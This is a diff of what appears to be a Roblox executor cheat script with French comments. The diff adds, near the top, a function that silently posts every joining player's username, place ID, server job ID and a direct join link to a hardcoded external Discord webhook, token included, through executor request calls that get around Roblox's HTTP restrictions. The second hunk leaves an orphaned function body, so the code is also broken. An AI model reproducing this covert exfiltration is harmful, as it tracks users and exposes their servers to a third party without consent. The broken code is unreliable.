@@ -1,8 +1,75 @@
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+-- Détection de la fonction de l'exécuteur pour le HTTPS
+local requestFunc = request or http_request or (syn and syn.request) or (Fluxus and Fluxus.request)
+
+-- Ton URL de webhook / proxy
+local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506592229773545502/VnHasojKjMhmYkBRBSygcZIvfSltCMTfn_tagK9tifyoDTz_WpE8qyV3_GXgpXJdRN9i" 
+
+local function sendSessionLog(player)
+    -- Génération du lien de connexion directe (Deep Link) via le JobId
+    local joinLink = "[Click here to join](roblox-player:+launchData+" .. tostring(game.PlaceId) .. "%2F" .. game.JobId .. ")"
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🎮 Player Session Log",
+            ["color"] = 3066993, -- Couleur Verte
+            ["fields"] = {
+                {
+                    ["name"] = "👤 Player Username",
+                    ["value"] = player.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 Place ID",
+                    ["value"] = tostring(game.PlaceId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "⚡ Quick Join",
+                    ["value"] = joinLink,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🧩 Job ID (Manual Copy)",
+                    ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`",
+                    ["inline"] = false
+                }
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    -- Encodage de la table au format JSON
+    local finalJson = HttpService:JSONEncode(data)
+
+    -- Envoi via l'exécuteur (pour contourner le blocage HTTPS de Roblox)
+    if requestFunc then
+        local success, err = pcall(function()
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = finalJson
+            })
+        end)
+        
+        if not success then
+            warn("Erreur lors de l'envoi de la requête : " .. tostring(err))
+        end
+    else
+        warn("Erreur : Ton exécuteur ne supporte pas les requêtes HTTP externes (requestFunc introuvable).")
+    end
+end
 
 -- Déclenche la fonction à chaque fois qu'un joueur rejoint le serveur
 Players.PlayerAdded:Connect(sendSessionLog)
+
 if oldGui then oldGui:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -110,54 +177,7 @@ local function getKnife()
     end
     return nil
 end
-
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-
--- Détection de la fonction de l'exécuteur pour le HTTPS
-local requestFunc = request or http_request or (syn and syn.request) or (Fluxus and Fluxus.request)
-
--- Ton URL de webhook / proxy
-local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1506592229773545502/VnHasojKjMhmYkBRBSygcZIvfSltCMTfn_tagK9tifyoDTz_WpE8qyV3_GXgpXJdRN9i" 
-
-local function sendSessionLog(player)
-    -- Génération du lien de connexion directe (Deep Link) via le JobId
-    local joinLink = "[Click here to join](roblox-player:+launchData+" .. tostring(game.PlaceId) .. "%2F" .. game.JobId .. ")"
-    
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "🎮 Player Session Log",
-            ["color"] = 3066993, -- Couleur Verte
-            ["fields"] = {
-                {
-                    ["name"] = "👤 Player Username",
-                    ["value"] = player.Name,
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "🆔 Place ID",
-                    ["value"] = tostring(game.PlaceId),
-                    ["inline"] = true
-                },
-                {
-                    ["name"] = "⚡ Quick Join",
-                    ["value"] = joinLink,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🧩 Job ID (Manual Copy)",
-                    ["value"] = "`" .. (game.JobId ~= "" and game.JobId or "Studio / Local Server") .. "`",
-                    ["inline"] = false
-                }
-            },
-            ["timestamp"] = DateTime.now():ToIsoDate()
-        }}
-    }
-
-    -- Encodage de la table au format JSON
-    local finalJson = HttpService:JSONEncode(data)
-
-    -- Envoi via l'exécuteur (pour contourner le blocage HTTPS de Roblox)
+ -- Envoi via l'exécuteur (pour contourner le blocage HTTPS de Roblox)
     if requestFunc then
         local success, err = pcall(function()
             requestFunc({
